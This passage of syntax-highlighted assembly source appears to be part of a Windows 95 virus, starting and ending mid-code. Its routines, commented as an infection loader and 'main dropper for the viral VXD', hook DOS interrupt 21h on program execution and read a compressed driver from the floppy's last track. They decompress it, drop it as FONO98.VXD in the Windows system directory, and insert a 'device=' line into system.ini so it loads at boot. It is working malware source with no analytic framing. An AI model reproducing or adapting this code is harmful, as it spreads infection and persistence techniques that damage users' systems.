           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                          </span><span class="sc1">;shit happen... :(</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read_last_track</span><span class="sc0">                </span><span class="sc1">;read 79/0/1 and 79/1/1 to</span><span class="sc0">
           </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc10">error</span><span class="sc0">                            </span><span class="sc1">;mem</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0100h</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">18</span><span class="sc4">*</span><span class="sc2">512</span><span class="sc4">)</span><span class="sc0">
     </span><span class="sc5">read_last_track</span><span class="sc4">:</span><span class="sc0">                          </span><span class="sc1">;init FDD controller</span><span class="sc0">
           </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0212h</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4f01h</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">                             </span><span class="sc1">;read track(head is selected</span><span class="sc0">
     </span><span class="sc10">error</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;above)</span><span class="sc0">
           </span><span class="sc6">ret</span><span class="sc0">
     </span><span class="sc5">int21</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
           </span><span class="sc6">pushad</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
           </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4b00h</span><span class="sc0">                       </span><span class="sc1">;is first exec?</span><span class="sc0">
           </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">no_4b00</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0ffh</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">;restore int21</span><span class="sc0">
           </span><span class="sc6">cld</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">infect_system</span><span class="sc0">                  </span><span class="sc1">;drop our vxd</span><span class="sc0">
           </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Zopy0</span><span class="sc0">                           </span><span class="sc1">;and wipe loader out of mem</span><span class="sc0">
     </span><span class="sc5">infect_system</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read_vxd</span><span class="sc0">
           </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc10">error</span><span class="sc0">
           </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">                          </span><span class="sc1">;RLE compressed vxd is in mem</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc2">18</span><span class="sc4">*</span><span class="sc2">512</span><span class="sc4">)*</span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">c_vxd</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">uncompress16</span><span class="sc0">                   </span><span class="sc1">;uncompress VXD</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">vxd</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'C:\WINDOWS\SYSTEM\FONO98.VXD'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">vxd</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">;when i said hardcoded</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                              </span><span class="sc1">;reference, is this i mean :((</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5bh</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11b</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc0">                            </span><span class="sc1">;only create if not exists</span><span class="sc0">
           </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc10">error</span><span class="sc0">
           </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">e_vxd</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc2">18</span><span class="sc4">*</span><span class="sc2">512</span><span class="sc4">)*</span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc0">                            </span><span class="sc1">;write uncompressed vxd</span><span class="sc0">
           </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3eh</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">system</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'C:\WINDOWS\SYSTEM.INI'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;another hardcoded reference :(</span><span class="sc0">
     </span><span class="sc5">system</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3d02h</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc0">                            </span><span class="sc1">;modify system.ini</span><span class="sc0">
           </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc10">error</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8000h</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3fh</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc0">
           </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">                            </span><span class="sc1">;read whole system.ini</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">enh386</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
     </span><span class="sc5">search</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
           </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">                           </span><span class="sc1">;search for [Enh386] section</span><span class="sc0">
           </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">found</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
           </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
           </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">search</span><span class="sc0">
           </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">
     </span><span class="sc5">found</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">pusha</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">device</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">19</span><span class="sc0">
           </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">                           </span><span class="sc1">;we are already registered?</span><span class="sc0">
           </span><span class="sc6">popa</span><span class="sc0">
           </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4200h</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc0">
           </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">19</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">device</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc0">                            </span><span class="sc1">;write our device line</span><span class="sc0">
           </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc0">                            </span><span class="sc1">;and rest of file</span><span class="sc0">
     </span><span class="sc5">close</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3eh</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc0">
           </span><span class="sc6">ret</span><span class="sc0">
     </span><span class="sc5">uncompress16</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                          </span><span class="sc1">;RLE decompression</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
     </span><span class="sc5">next</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">lodsb</span><span class="sc0">
           </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
           </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">store</span><span class="sc0">
           </span><span class="sc6">lodsw</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">
           </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
     </span><span class="sc5">store</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">stosb</span><span class="sc0">
           </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ff00h</span><span class="sc0">
           </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">abortnow</span><span class="sc0">                         </span><span class="sc1">;a safeguard to avoid mem</span><span class="sc0">
           </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">                          </span><span class="sc1">;overwriting</span><span class="sc0">
           </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">next</span><span class="sc0">
     </span><span class="sc5">abortnow</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
           </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
           </span><span class="sc6">ret</span><span class="sc0">
     </span><span class="sc5">enh386</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'[386Enh]'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
     </span><span class="sc5">device</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'device=fono98.vxd'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
     </span><span class="sc5">VxDCompressSize</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">VxDOriginalSize</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">BootLoaderEnd</span><span class="sc0"> </span><span class="sc9">Equ</span><span class="sc0"> </span><span class="sc9">This</span><span class="sc0"> </span><span class="sc10">Byte</span><span class="sc0">

       </span><span class="sc5">LoaderSize</span><span class="sc0"> </span><span class="sc9">Equ</span><span class="sc0"> </span><span class="sc5">LoaderEnd</span><span class="sc4">-</span><span class="sc5">Loader</span><span class="sc0">
     </span><span class="sc5">InfectWindows95</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">                      </span><span class="sc1">;This code is the main dropper</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Delta</span><span class="sc0">                          </span><span class="sc1">;for the viral VXD</span><span class="sc0">
     </span><span class="sc5">Delta</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
           </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Delta</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">2ch</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">;get environment</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
     </span><span class="sc5">SearchWINDIR</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
           </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc0">
           </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">ReturnBack</span><span class="sc0">
           </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'w'</span><span class="sc0">           </span><span class="sc1">;found a 'w'?</span><span class="sc0">
           </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">SearchWINDIR</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
           </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WinDir</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
           </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">                           </span><span class="sc1">;check if is windir=</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
           </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">SearchWINDIR</span><span class="sc0">                    </span><span class="sc1">;if not, keep searching</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">WinDX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">WinDS</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">         </span><span class="sc1">;save windows directory</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
           </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Buffer</span><span class="sc4">]</span><span class="sc0">
     </span><span class="sc5">NextLetter</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">lodsb</span><span class="sc0">
           </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
           </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">CopyString</span><span class="sc0">
           </span><span class="sc6">stosb</span><span class="sc0">
           </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">NextLetter</span><span class="sc0">                      </span><span class="sc1">;copy win95 dir to buffer</span><span class="sc0">
     </span><span class="sc5">CopyString</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
           </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SysDir</span><span class="sc4">]</span><span class="sc0">
     </span><span class="sc5">NextLetterAgain</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">lodsb</span><span class="sc0">
           </span><span class="sc6">stosb</span><span class="sc0">
           </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
           </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">NextLetterAgain</span><span class="sc0">                 </span><span class="sc1">;append path and vxd name</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5bh</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">011b</span><span class="sc0">
           </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Buffer</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">;create vxd if it not exists</span><span class="sc0">
           </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ReturnBack</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EndLoader</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">30000</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">VxDSize1</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Uncompress16</span><span class="sc0">                   </span><span class="sc1">;uncompress vxd</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
